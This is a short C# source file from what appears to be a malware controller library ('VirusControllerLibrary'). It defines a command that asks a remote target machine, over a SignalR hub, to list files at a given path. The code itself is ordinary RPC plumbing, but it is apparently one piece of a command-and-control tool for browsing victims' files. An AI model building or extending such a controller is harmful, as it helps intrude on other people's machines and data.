using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class GetFilesCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public override string Name => "GetFiles";
        public string TargetId { get; private set; }

        private string _filePath;

        public GetFilesCommand(string targetId, string filePath)
        {
            TargetId = targetId;
            _filePath = filePath;
        }

        public override async Task ExecuteAsync()
        {
            await _hubConnection?.InvokeAsync(Name, TargetId, _filePath);
            Console.WriteLine("команда на получение директории вызвана");
        }
    }
}
